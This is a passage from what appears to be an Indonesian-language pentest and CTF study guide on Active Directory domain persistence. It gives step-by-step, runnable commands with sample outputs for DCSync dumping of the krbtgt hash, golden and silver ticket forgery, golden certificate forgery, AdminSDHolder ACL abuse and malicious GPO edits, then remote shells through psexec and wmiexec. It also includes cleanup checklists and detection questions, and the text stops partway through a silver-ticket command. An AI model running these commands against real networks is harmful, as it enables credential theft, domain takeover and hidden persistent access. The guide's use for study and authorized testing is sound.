python3 /opt/impacket/examples/dacledit.py \
    -action write \
    -rights FullControl \
    -principal "$USERNAME" \
    -target-dn "CN=AdminSDHolder,CN=System,DC=domain,DC=local" \
    "$DOMAIN/$USERNAME:$PASSWORD" \
    -dc-ip "$DC_IP"
```

```bash
# 3. Re-read ACL
python3 /opt/impacket/examples/dacledit.py \
    -action read \
    -target-dn "CN=AdminSDHolder,CN=System,DC=domain,DC=local" \
    "$DOMAIN/$USERNAME:$PASSWORD" \
    -dc-ip "$DC_IP"
```

```text
# 4. Wait/trigger SDProp
# 5. Verify protected object ACL
```

---

# 14.6 🏛️ GOLDEN CERTIFICATE

```bash
# ==========================================
# GOLDEN CERTIFICATE - LAB CHEATSHEET
# ==========================================

# 1. Forge certificate using CA private key
certipy forge \
    -ca-pfx "$CA_PFX" \
    -upn "administrator@$DOMAIN"
```

```bash
# 2. Authenticate using forged certificate
certipy auth \
    -pfx "administrator_forged.pfx" \
    -dc-ip "$DC_IP"
```

```bash
# 3. Load resulting Kerberos cache
export KRB5CCNAME="$PWD/administrator.ccache"

# Verify
klist
```

> Golden Certificate remediation normally requires dealing with the **CA key compromise**, not simply deleting the `.pfx`.

---

# 14.7 📜 MALICIOUS GPO

```powershell
# ==========================================
# MALICIOUS GPO - LAB CHEATSHEET
# ==========================================

# 1. Enumerate GPO
Get-DomainGPO
```

```powershell
# 2. Find writable GPO ACLs
Get-DomainGPO |
    Get-DomainObjectAcl -ResolveGUIDs |
    Where-Object {
        $_.ActiveDirectoryRights -match "Write"
    }
```

```powershell
# 3. Controlled lab GPO modification
.\SharpGPOAbuse.exe `
    --AddLocalAdmin `
    --UserAccount "$USERNAME" `
    --GPOName "Lab-GPO"
```

```powershell
# 4. Force Group Policy refresh in the lab
gpupdate /force
```

---

# 🪪 15. CROSS-WORKFLOW NAVIGATION

## ← File 42 — Lateral Movement

Setelah lateral movement:

```text
Lateral Movement
       │
       ▼
DC / High Privilege Host
       │
       ▼
Persistence
```

Jadi File 42 menjawab:

> **"Bagaimana berpindah ke host lain?"**

File 43 menjawab:

> **"Bagaimana mempertahankan akses setelah berpindah?"**

← [**File 42: Lateral Movement**](https://chatgpt.com/42-lateral-movement/[🧭 Workflow 42 — Lateral Movement](/docs/lateral-movement))

---

## ← File 40 — AD CS

File 40:

```text
AD CS exploitation
```

File 43:

```text
Golden Certificate
```

Hubungannya:

```text
CA private key
      │
      ▼
Certificate forgery
      │
      ▼
Authentication
      │
      ▼
Persistence
```

← [**File 40: AD CS Workflow**](https://chatgpt.com/40-adcs/[🔐 Workflow 40 — Active Directory Certificate Services (AD CS)](/docs/adcs))

---

## ← File 37 — Kerberoasting

Kerberoasting dapat memberikan service account credential:

```text
TGS
 │
 ▼
Crack
 │
 ▼
Service Account
 │
 ▼
Service Key
 │
 ▼
Silver Ticket candidate
```

← [**File 37: Kerberoasting & AS-REP Roasting**](https://chatgpt.com/37-kerberoasting-asrep-roasting/[🔥 Workflow 37 — Kerberoasting & AS-REP Roasting](/docs/kerberoasting-asreproasting))

---

## → File 44 — Linux Privilege Escalation

Jika domain/network environment memiliki Linux systems:

```text
Lateral Movement
       │
       ▼
Linux Host
       │
       ▼
Linux PrivEsc
```

→ [**File 44: Linux Privilege Escalation**](https://chatgpt.com/44-linux-privesc/<a href="/docs/linux-privesc" class="text-[#00b4d8] hover:underline font-mono font-semibold">44_linux_privesc_workflow.md</a>)

---

## → File 45 — Windows Privilege Escalation

Jika belum memperoleh DA:

```text
Lateral Movement
       │
       ▼
Windows Host
       │
       ▼
Windows PrivEsc
       │
       ▼
Domain / Local Admin
```

→ [**File 45: Windows Privilege Escalation**](https://chatgpt.com/45-windows-privesc/<a href="/docs/windows-privesc" class="text-[#00b4d8] hover:underline font-mono font-semibold">45_windows_privesc_workflow.md</a>)

---

# 🧠 16. FINAL MENTAL MODEL

Jangan menghafalkan:

```text
Golden
Silver
Skeleton
DSRM
AdminSDHolder
Golden Cert
GPO
SIDHistory
DCShadow
```

sebagai daftar terpisah.

Kelompokkan berdasarkan **apa yang dipercaya oleh domain**.

---

# 16.1 🎟️ Ticket Trust

```text
KRBTGT
  │
  ▼
Golden Ticket
```

```text
SERVICE KEY
  │
  ▼
Silver Ticket
```

---

# 16.2 🪪 Certificate Trust

```text
CA PRIVATE KEY
      │
      ▼
Golden Certificate
      │
      ▼
PKINIT
      │
      ▼
TGT
```

---

# 16.3 🔐 Directory ACL Trust

```text
AdminSDHolder
      │
      ▼
SDProp
      │
      ▼
Protected Objects
```

---

# 16.4 📜 Policy Trust

```text
GPO
 │
 ▼
Computers / Users
 │
 ▼
Policy
 │
 ▼
Persistence
```

---

# 16.5 🪪 Identity History Trust

```text
SIDHistory
    │
    ▼
Authorization Token
    │
    ▼
Potential privileged access
```

---

# 16.6 🗄️ Recovery Trust

```text
DSRM
 │
 ▼
DC Recovery Account
 │
 ▼
Potential DC local access
```

---

# 16.7 🧬 In-Memory Authentication Trust

```text
Skeleton Key
    │
    ▼
LSASS authentication behavior
    │
    ▼
temporary alternate password
```

---

# 16.8 🌀 Replication Trust

```text
DCShadow
    │
    ▼
Replication semantics
    │
    ▼
Directory modification
```

---

# 🌳 17. SUPER DECISION TREE

```text
                         DOMAIN COMPROMISED
                                │
                                ▼
                     "WHAT TRUST CAN I CONTROL?"
                                │
             ┌──────────────────┼──────────────────┐
             │                  │                  │
             ▼                  ▼                  ▼
          KERBEROS             PKI               AD OBJECT
             │                  │                  │
       ┌─────┴─────┐            │          ┌──────┴────────┐
       ▼           ▼            ▼          ▼               ▼
    KRBTGT      Service      CA key    AdminSDHolder     GPO
       │           │            │          │               │
       ▼           ▼            ▼          ▼               ▼
    GOLDEN      SILVER       GOLDEN      ACL             POLICY
    TICKET      TICKET       CERT       PERSISTENCE     PERSISTENCE
       │           │            │          │               │
       └───────────┼────────────┼──────────┼───────────────┘
                   │
                   ▼
               LONGER-LIVED
                  ACCESS
                   │
                   ▼
              REASSESS / VERIFY
```

---

# 🧠 17.1 Jika Butuh "Paling Fleksibel"

```text
KRBTGT key
    │
    ▼
Golden Ticket
```

Tetapi:

```text
Fleksibilitas
   ≠
stealth
```

---

# 🧠 17.2 Jika Butuh "Service-Specific"

```text
Service key
    │
    ▼
Silver Ticket
```

---

# 🧠 17.3 Jika Butuh "PKI-Based"

```text
CA private key
     │
     ▼
Golden Certificate
```

---

# 🧠 17.4 Jika Butuh "Directory-Based"

```text
AdminSDHolder
     │
     ▼
ACL persistence
```

atau:

```text
GPO
 │
 ▼
Policy persistence
```

---

# ⚠️ 18. PERSISTENCE VS ACCESS

Ini konsep yang harus sangat jelas.

Misalnya:

```text
Golden Ticket
   │
   ▼
Authentication material
```

Belum tentu:

```text
Every service
```

akan memberikan:

```text
Administrator-like authorization
```

Demikian juga:

```text
Certificate
```

tidak otomatis:

```text
Domain Admin
```

Maka selalu pisahkan:

```text
PERSISTENCE
    │
    ▼
AUTHENTICATION
    │
    ▼
IDENTITY
    │
    ▼
AUTHORIZATION
    │
    ▼
IMPACT
```

---

# 🔍 18.1 Authentication vs Authorization

```text
Authentication:
"Siapa kamu?"
```

```text
Authorization:
"Apa yang boleh kamu lakukan?"
```

Persistence bisa memecahkan:

```text
authentication continuity
```

tetapi impact akhirnya ditentukan:

```text
authorization
```

---

# 🧹 19. CLEANUP MASTER CHECKLIST

Setelah CTF/lab:

```text
[ ] Delete forged .ccache
[ ] Remove generated PFX
[ ] Remove temporary certificates
[ ] Remove fake computer accounts
[ ] Remove RBCD configuration if used
[ ] Remove shadow credentials if used
[ ] Restore AdminSDHolder ACL
[ ] Remove malicious GPO settings
[ ] Restore DSRM registry configuration
[ ] Remove temporary local accounts
[ ] Stop persistence-related listeners
[ ] Restore registry modifications
[ ] Remove temporary files
[ ] Verify AD state
[ ] Verify protected group memberships
[ ] Verify GPO state
[ ] Verify certificate inventory
```

---

# 🏢 19.1 Real Pentest Cleanup

Dalam real pentest:

```text
Modification
   │
   ▼
Document
   │
   ▼
Restore
   │
   ▼
Verify
   │
   ▼
Report
```

Bukan:

```text
"delete the file"
```

saja.

Untuk beberapa technique:

```text
Golden Certificate
```

atau:

```text
KRBTGT compromise
```

cleanup dapat membutuhkan **key rotation / certificate revocation / identity remediation**, bukan sekadar menghapus artifact lokal.

---

# ✅ 20. DOMAIN PERSISTENCE CHECKLIST

```text
[ ] Do I have DA/equivalent?
[ ] Is persistence actually required?
[ ] Is this CTF or authorized pentest?
[ ] Have I documented the change?
[ ] Do I control KRBTGT key material?
[ ] Do I know domain SID?
[ ] Do I know the CA trust chain?
[ ] Do I control a service key?
[ ] Do I control AdminSDHolder?
[ ] Do I control a GPO?
[ ] Do I have DSRM credentials?
[ ] Is SIDHistory modifiable?
[ ] Do I possess CA private key?
[ ] What is the persistence scope?
[ ] What is the detection surface?
[ ] What is the cleanup method?
```

---

# 🏁 21. ONE-MINUTE SUMMARY

```text
                 DOMAIN ACCESS
                      │
                      ▼
             WHAT TRUST DO I CONTROL?
                      │
      ┌───────────────┼────────────────┐
      │               │                │
      ▼               ▼                ▼
   KERBEROS           PKI             AD
      │               │                │
      ▼               ▼          ┌─────┼─────┐
  Golden/Silver     Golden      GPO   ACL   SIDHistory
      │             Cert         │     │        │
      │               │          │     │        │
      └───────────────┼──────────┴─────┴────────┘
                      │
                      ▼
                  PERSISTENCE
                      │
                      ▼
               AUTHENTICATION
                      │
                      ▼
                 AUTHORIZATION
                      │
                      ▼
                   IMPACT
```

---

# 🧠 FINAL GOLDEN RULES

## Rule 1 — 🔑 KRBTGT Is Crown-Jewel Material

```text
KRBTGT key
   ↓
Golden Ticket capability
```

Protect and rotate carefully.

---

## Rule 2 — 🪪 CA Private Key Is Also Crown-Jewel Material

```text
CA private key
    ↓
certificate forgery
    ↓
authentication
```

---

## Rule 3 — 🎫 Golden ≠ Silver

```text
Golden
= TGT

Silver
= TGS
```

---

## Rule 4 — 🦴 Skeleton Key Is Not Truly Long-Term

```text
reboot
  ↓
memory patch gone
```

---

## Rule 5 — 🛡️ AdminSDHolder Is a Directory ACL Mechanism

```text
AdminSDHolder
      ↓
SDProp
      ↓
Protected Objects
```

Microsoft documents SDProp as the process that reapplies AdminSDHolder permissions to protected accounts/groups, by default on approximately a 60-minute cycle at the PDC Emulator.

---

## Rule 6 — 📜 GPO Scope Matters

```text
GPO write
```

is important.

But:

```text
GPO write
+
wide link
=
large impact
```

---

## Rule 7 — 🪪 SIDHistory Is Identity-Based Persistence

```text
SIDHistory
   ↓
authorization token
```

---

## Rule 8 — 🗄️ DSRM Is Local to the DC

```text
DOMAIN\Administrator
      ≠
DC01\Administrator
```

---

## Rule 9 — 🧬 DCShadow Is Advanced

Understand:

```text
replication
```

before attempting to understand:

```text
DCShadow
```

---

## Rule 10 — 🧠 Persistence Is Not the Same as Privilege

```text
Persistence
     ≠
Authorization
```

Always trace the complete chain.

---

## Rule 11 — 🔍 Verify, Don't Assume

After implementing persistence:

```text
PERSISTENCE CREATED
       │
       ▼
VERIFY
       │
       ├── Authentication
       ├── Identity
       ├── Authorization
       └── Scope
```

---

## Rule 12 — 🧹 Cleanup Is Part of the Workflow

```text
EXPLOIT
   ↓
VERIFY
   ↓
DOCUMENT
   ↓
CLEANUP
   ↓
VERIFY CLEANUP
```

---

# 🎯 FINAL MUSCLE MEMORY

Saat kamu mendapatkan:

```text
DOMAIN ADMIN
```

jangan langsung menghafal semua persistence technique.

Tanyakan:

```text
1. Apa trust boundary yang sekarang bisa saya kontrol?

   ├── Kerberos?
   ├── PKI?
   ├── GPO?
   ├── ACL?
   ├── service account?
   └── recovery account?

2. Apa artifact yang menjadi root of trust?

   ├── KRBTGT key
   ├── service key
   ├── CA private key
   ├── ACL
   ├── GPO
   └── SIDHistory

3. Berapa luas impact-nya?

   ├── one service
   ├── one host
   ├── one OU
   └── entire domain

4. Bagaimana defender mendeteksinya?

5. Bagaimana saya mencabutnya?
```

Kemudian pilih:

```text
KRBTGT key
    → Golden Ticket

Service key
    → Silver Ticket

LSASS
    → Skeleton Key

DSRM credential
    → DSRM path

AdminSDHolder ACL
    → ACL persistence

CA private key
    → Golden Certificate

GPO write
    → GPO persistence

SIDHistory
    → Identity persistence

Replication rights
    → DCShadow
```

---

# 🧭 THE BIG PICTURE

```text
             FILE 42
       LATERAL MOVEMENT
               │
               ▼
         HIGH-VALUE HOST
               │
               ▼
        DOMAIN ADMIN /
        EQUIVALENT ACCESS
               │
               ▼
        ┌───────────────┐
        │ PERSISTENCE?  │
        └───────┬───────┘
                │
      ┌─────────┼─────────┐
      │         │         │
      ▼         ▼         ▼
   KERBEROS    PKI       AD
      │         │         │
      ▼         ▼         ▼
   Golden    Golden    AdminSDHolder
   Silver     Cert     GPO
      │                   │
      └─────────┬─────────┘
                ▼
          MAINTAIN ACCESS
                │
                ▼
         VERIFY / CLEANUP
                │
                ▼
             REPORT
```

> **Kalimat yang harus tertanam:**
> 
> **Domain persistence bukan tentang membuat satu "backdoor". Ia tentang menemukan trust mechanism Active Directory yang sudah dipercaya domain, lalu memahami apakah attacker dapat mempertahankan atau menyalahgunakan trust tersebut.**
> 
> **KRBTGT → Kerberos trust.**  
> **CA private key → PKI trust.**  
> **AdminSDHolder/GPO → directory/policy trust.**  
> **Service key → service trust.**  
> **SIDHistory → identity/authorization trust.**

---

# [🔐 Workflow 43 — Domain Persistence](/docs/domain-persistence) — Interactive Decision Guide

> **Cara baca:** Setiap langkah punya **OUTPUT BERHASIL** ✅ dan **OUTPUT GAGAL/BERBEDA** ❌. Ikuti panah sesuai output yang kamu dapat. Jangan skip langkah.

---

## 🔧 PRE-FLIGHT: Setup Environment

Bash

```
# Jalankan INI DULU sebelum apapun
export DC_IP="10.10.10.10"
export DOMAIN="corp.local"
export DOMAIN_SHORT="CORP"
export USERNAME="administrator"
export PASSWORD="Password123!"
export LHOST="10.10.14.5"        # IP tun0 kamu

mkdir -p ~/persistence/{golden,silver,certificates,gpo,dsrm,logs}
cd ~/persistence

echo "[*] Target DC: $DC_IP | Domain: $DOMAIN | User: $USERNAME"
```

**Output yang diharapkan:**

text

```
[*] Target DC: 10.10.10.10 | Domain: corp.local | User: administrator
```

---

## ═══════════════════════════════════════

## FASE 0: KONFIRMASI PRIVILEGE LEVEL

## ═══════════════════════════════════════

> **Tujuan:** Pastikan kamu punya cukup privilege sebelum mencoba teknik persistence apapun. Jangan buang waktu.

### Langkah 0.1 — Verifikasi Akses Domain Admin

Bash

```
# Command 1: Cek apakah credentials valid dan level privilege
nxc smb $DC_IP -u "$USERNAME" -p "$PASSWORD"

# Command 2: Cek apakah bisa DCSync (tanda DA/replication rights)
impacket-secretsdump "$DOMAIN/$USERNAME:$PASSWORD@$DC_IP" -just-dc-user "krbtgt" 2>&1 | head -20

# Command 3: Jika punya shell di target Windows, cek grup
net user $USERNAME /domain | grep -i "group"
whoami /groups | findstr /i "admin"
```

**OUTPUT BERHASIL ✅ — Credentials valid + Pwn3d:**

text

```
SMB   10.10.10.10  445  DC01  [+] CORP\administrator:Password123! (Pwn3d!)
```

text

```
[*] Using the DRSUAPI method to get NTDS.DIT secrets
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065f6a9ed:::
```

➡️ **Kamu punya Domain Admin.** Lanjut ke **Langkah 0.2**

**OUTPUT BERHASIL ✅ — Valid tapi bukan admin:**

text

```
SMB   10.10.10.10  445  DC01  [+] CORP\someuser:Password123!
```

(Tidak ada `Pwn3d!`)

➡️ Kamu belum DA. Pergi ke **[🪟 45 — Windows Privilege Escalation Workflow](/docs/windows-privesc)** atau **[🔐 File 38 — Active Directory ACL Abuse Workflow](/docs/ad-acl-abuse)** dulu.

**OUTPUT GAGAL ❌ — DCSync denied:**

text

```
[-] DRSUAPI SessionError: code: 0x20f7 - ERROR_DS_DRA_ACCESS_DENIED
```

➡️ Tidak punya replication rights. Kemungkinan bukan DA. Cek apakah ada ACL abuse path di **[🔐 File 38 — Active Directory ACL Abuse Workflow](/docs/ad-acl-abuse)**.

---

### Langkah 0.2 — Identifikasi Environment (Kritis untuk Pilih Teknik)

Bash

```
# Command 1: Info domain lengkap
nxc smb $DC_IP -u "$USERNAME" -p "$PASSWORD" --pass-pol

# Command 2: Cek apakah ada AD CS (Certificate Services)
nxc ldap $DC_IP -u "$USERNAME" -p "$PASSWORD" -M adcs

# Command 3: Enumerate DC hostname untuk /etc/hosts
nmap -sV -p 389 $DC_IP --script ldap-rootdse 2>/dev/null | grep -i "name\|domain"

# Command 4: Tambahkan ke /etc/hosts (WAJIB untuk Kerberos)
# Ganti DC01 dengan hostname yang ditemukan
echo "$DC_IP DC01.$DOMAIN DC01 $DOMAIN" | sudo tee -a /etc/hosts
```

**OUTPUT BERHASIL ✅ — Info lengkap:**

text

```
SMB   10.10.10.10  445  DC01  [*] Domain: corp.local | DC: DC01
LDAP  10.10.10.10  389  DC01  [+] ADCS Found: corp-DC01-CA
```

**Cara baca — tentukan teknik yang tersedia:**

|Kondisi|Teknik yang Tersedia|
|---|---|
|Bisa DCSync → KRBTGT|**Golden Ticket** (prioritas)|
|Ada AD CS → CA key|**Golden Certificate**|
|Punya shell di DC|**Skeleton Key, DSRM**|
|Ada GPO writable|**Malicious GPO**|
|Bisa modify AdminSDHolder|**AdminSDHolder Abuse**|
|Kerberoast dapat service hash|**Silver Ticket**|

➡️ Lanjut ke fase sesuai teknik yang tersedia. **Mulai dari Golden Ticket (Fase 1) dulu.**

---

## ═══════════════════════════════════════

## FASE 1: GOLDEN TICKET — KRBTGT KEY EXTRACTION

## ═══════════════════════════════════════

> **Prasyarat:** Domain Admin atau replication rights  
> **Impact:** Bisa forge TGT untuk identity apapun di domain  
> **Kenapa duluan:** Paling powerful, tidak perlu interactive DC shell

### Langkah 1.1 — Dump KRBTGT Hash via DCSync

Bash

```
# Command 1: DCSync hanya untuk krbtgt (paling cepat, paling sedikit noise)
impacket-secretsdump "$DOMAIN/$USERNAME:$PASSWORD@$DC_IP" \
    -just-dc-user "krbtgt" \
    | tee ~/persistence/golden/krbtgt_dump.txt

# Command 2: Jika command 1 gagal, coba dengan netlogon pipe
impacket-secretsdump "$DOMAIN/$USERNAME:$PASSWORD@$DC_IP" \
    -just-dc-user "krbtgt" \
    -use-vss

# Command 3: Alternatif — dump semua lalu filter
impacket-secretsdump "$DOMAIN/$USERNAME:$PASSWORD@$DC_IP" \
    -just-dc \
    | grep -i "krbtgt" \
    | tee ~/persistence/golden/krbtgt_dump.txt
```

**OUTPUT BERHASIL ✅ — Hash didapat:**

text

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065f6a9ed:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:abc123def456abc123def456abc123def456abc123def456abc123def456abc1
krbtgt:aes128-cts-hmac-sha1-96:abc123def456abc123def456abc1
krbtgt:des-cbc-md5:abc123def456abc1
```

**Cara baca output — CATAT SEMUA:**

|Field|Contoh|Penggunaan|
|---|---|---|
|NT Hash (field ke-4)|`9d765b482771505cbe97411065f6a9ed`|`-nthash` di ticketer|
|AES256 key|`abc123def456...`|`-aesKey` (lebih stealth)|
|AES128 key|`abc123def456...`|Fallback jika AES256 gagal|

Bash

```
# Simpan ke variabel
export KRBTGT_NTLM="9d765b482771505cbe97411065f6a9ed"
export KRBTGT_AES256="abc123def456abc123def456abc123def456abc123def456abc123def456abc1"
echo "KRBTGT_NTLM=$KRBTGT_NTLM" >> ~/persistence/golden/keys.txt
echo "KRBTGT_AES256=$KRBTGT_AES256" >> ~/persistence/golden/keys.txt
```

**OUTPUT GAGAL ❌ — Access Denied:**

text

```
[-] DRSUAPI SessionError: code: 0x20f7 - ERROR_DS_DRA_ACCESS_DENIED
```

➡️ User bukan DA. Cek dengan:

Bash

```
# Cek apakah user punya DS-Replication-Get-Changes
impacket-dacledit "$DOMAIN/$USERNAME:$PASSWORD@$DC_IP" \
    -action read \
    -target "$DOMAIN" \
    -dc-ip $DC_IP 2>/dev/null | grep -i "replication"
```

➡️ Jika tidak ada replication rights → ke **<a href="/docs/ad-acl-abuse" class="text-[#00b4d8] hover:underline font-mono font-semibold">38_ad_acl_abuse_workflow.md</a>**

**OUTPUT GAGAL ❌ — Connection timeout:**

text

```
[-] Connection error: timed out
```

➡️ Coba dengan flag `-debug` dan cek konektivitas:

Bash

```
ping -c 3 $DC_IP
nmap -p 445,389 $DC_IP
# Jika firewall → coba via SMB named pipe
impacket-secretsdump "$DOMAIN/$USERNAME:$PASSWORD@$DC_IP" -just-dc-user "krbtgt" -debug
```

---

### Langkah 1.2 — Dapatkan Domain SID

Bash

```
# Command 1: Via lookupsid (paling reliable)
impacket-lookupsid "$DOMAIN/$USERNAME:$PASSWORD@$DC_IP" | head -10

# Command 2: Via rpcclient
rpcclient -U "$USERNAME%$PASSWORD" "$DC_IP" -c "lsaquery"

# Command 3: Via ldapsearch
ldapsearch -x \
    -H "ldap://$DC_IP" \
    -D "CN=$USERNAME,CN=Users,DC=corp,DC=local" \
    -w "$PASSWORD" \
    -b "DC=corp,DC=local" \
    "(objectClass=domain)" \
    objectSid 2>/dev/null | grep -i "sid"

# Command 4: Via nxc
nxc ldap $DC_IP -u "$USERNAME" -p "$PASSWORD" --get-sid
```

**OUTPUT BERHASIL ✅ — SID didapat:**

text

```
[*] Brute forcing SIDs at 10.10.10.10
[*] StringBinding ncacn_np:10.10.10.10[\pipe\lsarpc]
500: CORP\Administrator (SidTypeUser)
512: CORP\Domain Admins (SidTypeGroup)

Domain Sid: S-1-5-21-1234567890-0987654321-1122334455
```

Bash

```
# Simpan Domain SID (tanpa RID di belakang)
export DOMAIN_SID="S-1-5-21-1234567890-0987654321-1122334455"
echo "DOMAIN_SID=$DOMAIN_SID" >> ~/persistence/golden/keys.txt
```

**⚠️ JANGAN masukkan RID (-500, -512, dll) ke dalam DOMAIN_SID!**

**OUTPUT GAGAL ❌ — lookupsid tidak bisa connect:**

text

```
[-] Connection refused
```

➡️ Coba metode lain (rpcclient atau ldapsearch di atas)

---

### Langkah 1.3 — Forge Golden Ticket

Bash

```
# PENTING: Pastikan /etc/hosts sudah benar sebelum forge!
cat /etc/hosts | grep "$DOMAIN"

# Sinkronisasi waktu dengan DC (kritis untuk Kerberos)
sudo rdate -n $DC_IP 2>/dev/null || sudo ntpdate $DC_IP 2>/dev/null

# Command 1: Forge menggunakan NT hash
impacket-ticketer \
    -nthash "$KRBTGT_NTLM" \
    -domain-sid "$DOMAIN_SID" \
    -domain "$DOMAIN" \
    "administrator" \
    -outfile ~/persistence/golden/administrator.ccache

# Command 2: Forge menggunakan AES256 (lebih stealth, pilih ini jika tersedia)
impacket-ticketer \
    -aesKey "$KRBTGT_AES256" \
    -domain-sid "$DOMAIN_SID" \
    -domain "$DOMAIN" \
    "administrator" \
    -outfile ~/persistence/golden/administrator_aes.ccache

# Command 3: Forge dengan extra group memberships (jika butuh Enterprise Admin)
impacket-ticketer \
    -nthash "$KRBTGT_NTLM" \
    -domain-sid "$DOMAIN_SID" \
    -domain "$DOMAIN" \
    -groups "512,519,520,518" \
    "administrator" \
    -outfile ~/persistence/golden/administrator_ea.ccache
```

**OUTPUT BERHASIL ✅:**

text

```
[*] Creating golden ticket
[*] User        : administrator
[*] Domain      : corp.local
[*] Domain SID  : S-1-5-21-1234567890-0987654321-1122334455
[*] User ID     : 500
[*] Groups ID   : 513 512 520 518 519
[*] Saving ticket in administrator.ccache
```

**OUTPUT GAGAL ❌ — Invalid domain SID:**

text

```
[-] Got error while trying to generate TGT
```

➡️ Cek apakah domain SID benar (tidak ada RID di belakang, format `S-1-5-21-X-X-X`)

**OUTPUT GAGAL ❌ — Encryption error:**

text

```
[-] Kerberos SessionError: KRB_AP_ERR_SKEW
```

➡️ Clock skew. Sinkronisasi waktu:

Bash

```
sudo timedatectl set-ntp off
sudo rdate -s $DC_IP
```

---

### Langkah 1.4 — Gunakan Golden Ticket

Bash

```
# Load ticket ke environment
export KRB5CCNAME="$HOME/persistence/golden/administrator.ccache"

# Verifikasi ticket loaded
klist
```

**OUTPUT BERHASIL ✅ — klist menunjukkan ticket:**

text

```
Credentials cache: FILE:/root/persistence/golden/administrator.ccache
        Principal: administrator@CORP.LOCAL

Valid starting       Expires              Service principal
09/08/2026 15:00:00  10/08/2026 15:00:00  krbtgt/CORP.LOCAL@CORP.LOCAL
```

Bash

```
# Test 1: Akses SMB ke DC (gunakan HOSTNAME bukan IP!)
impacket-psexec \
    -k \
    -no-pass \
    "$DOMAIN/administrator@DC01.$DOMAIN"

# Test 2: WMIExec (lebih stealth)
impacket-wmiexec \
    -k \
    -no-pass \
    "$DOMAIN/administrator@DC01.$DOMAIN"

# Test 3: SMBClient
smbclient \
    "//DC01.$DOMAIN/C$" \
    -k \
    --no-pass

# Test 4: secretsdump dengan ticket
impacket-secretsdump \
    -k \
    -no-pass \
    "$DOMAIN/administrator@DC01.$DOMAIN"
```

**OUTPUT BERHASIL ✅ — Shell via psexec:**

text

```
[*] Requesting shares on DC01.corp.local
[*] Found writable share ADMIN$
[*] Uploading file ...
Microsoft Windows [Version 10.0.17763]
C:\Windows\system32> whoami
nt authority\system
```

➡️ **GOLDEN TICKET BERHASIL!** Simpan ccache dengan aman:

Bash

```
cp ~/persistence/golden/administrator.ccache ~/persistence/golden/administrator_backup.ccache
chmod 600 ~/persistence/golden/*.ccache
```

**OUTPUT GAGAL ❌ — KRB_AP_ERR_MODIFIED:**

text

```
[-] Kerberos SessionError: KRB_AP_ERR_MODIFIED
```

➡️ Kemungkinan masalah:

|Kemungkinan Masalah|Solusi|
|---|---|
|Pakai IP bukan hostname|Pakai `DC01.corp.local` bukan `10.10.10.10`|
|KRBTGT hash salah|Dump ulang, cek hash ke-4 field|
|Domain SID salah|Verifikasi ulang via rpcclient|
|Clock skew|`sudo rdate -s $DC_IP`|

**OUTPUT GAGAL ❌ — Clock skew too great:**

text

```
[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

➡️ Fix:

Bash

```
sudo timedatectl set-ntp off
sudo rdate -s $DC_IP
# Coba lagi
```

**OUTPUT GAGAL ❌ — No credentials cache:**

text

```
klist: No credentials cache found (filename: /root/persistence/golden/administrator.ccache)
```

➡️ File tidak ada atau path salah:

Bash

```
ls -la ~/persistence/golden/
export KRB5CCNAME="$(pwd)/administrator.ccache"   # Pakai path absolut
```

> **🔍 Google search jika masih stuck:**  
> `"impacket ticketer KRB_AP_ERR_MODIFIED" site:github.com`  
> `"golden ticket clock skew kali linux fix"`

---

## ═══════════════════════════════════════

## FASE 2: SILVER TICKET — SERVICE-SPECIFIC FORGERY

## ═══════════════════════════════════════

> **Masuk sini jika:** KRBTGT tidak bisa di-dump TAPI punya service/computer account hash  
> **Atau:** Butuh akses ke service spesifik dengan lebih sedikit noise

### Langkah 2.1 — Dapatkan Service/Computer Account Hash

Bash

```
# Skenario A: Target service di computer account DC01$
impacket-secretsdump "$DOMAIN/$USERNAME:$PASSWORD@$DC_IP" \
    -just-dc-user "DC01$" \
    | tee ~/persistence/silver/dc_computer_hash.txt

# Skenario B: Target service account (dari kerberoasting)
# Jika sudah punya hasil kerberoasting → ke Langkah 2.2
# Jika belum, request TGS untuk service accounts
impacket-GetUserSPNs "$DOMAIN/$USERNAME:$PASSWORD" \
    -dc-ip $DC_IP \
    -request \
    | tee ~/persistence/silver/spn_hashes.txt

# Skenario C: Service account spesifik
impacket-secretsdump "$DOMAIN/$USERNAME:$PASSWORD@$DC_IP" \
    -just-dc-user "svc_mssql" \
    | tee ~/persistence/silver/svc_mssql_hash.txt
```

**OUTPUT BERHASIL ✅ — Computer account hash:**

text

```
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:aabbccddeeff00112233445566778899:::
DC01$:aes256-cts-hmac-sha1-96:aabbccdd...
```

Bash

```
# Simpan
export SERVICE_NTLM="aabbccddeeff00112233445566778899"
export TARGET_HOSTNAME="DC01"
echo "SERVICE_NTLM=$SERVICE_NTLM" >> ~/persistence/silver/keys.txt
```

**OUTPUT GAGAL ❌ — Computer account tidak bisa di-dump:**

text

```
[-] Account DC01$ not found
```

➡️ Cek nama computer account yang benar:

Bash

```
# List semua computer accounts
impacket-GetADUsers "$DOMAIN/$USERNAME:$PASSWORD" -dc-ip $DC_IP -all \
    | grep "\$"
```

---

### Langkah 2.2 — Tentukan SPN Target

Bash

```
# Lihat SPN yang ada di target host
impacket-GetUserSPNs "$DOMAIN/$USERNAME:$PASSWORD" \
    -dc-ip $DC_IP \
    -outputfile ~/persistence/silver/all_spns.txt
cat ~/persistence/silver/all_spns.txt

# Untuk computer account, SPN umumnya:
# cifs/DC01.corp.local         → file sharing
# host/DC01.corp.local         → general host services
# ldap/DC01.corp.local         → LDAP
# http/webserver.corp.local    → IIS/web
# MSSQLSvc/db.corp.local:1433  → SQL Server
# wsman/DC01.corp.local        → WinRM
```

**Tabel SPN untuk Silver Ticket:**

|Service yang Ingin Diakses|SPN Format|Akses yang Didapat|
|---|---|---|
|SMB/File share|`cifs/DC01.corp.local`|File system, C$|
|WinRM|`wsman/DC01.corp.local`|PowerShell remoting|
|MSSQL|`MSSQLSvc/db.corp.local:1433`|SQL query execution|
|HTTP/IIS|`http/web.corp.local`|Web app auth|
|LDAP|`ldap/DC01.corp.local`|Directory queries|

---

### Langkah 2.3 — Forge Silver Ticket

Bash

```
# Contoh: Silver ticket untuk CIFS/SMB
impacket-ticketer \
    -nthash "$SERVICE_NTLM" \
    -domain-sid "$DOMAIN_SID" \
    -domain "$DOMAIN" \
    -spn "cifs/$TARGET_HOSTNAME.$DOMAIN" \
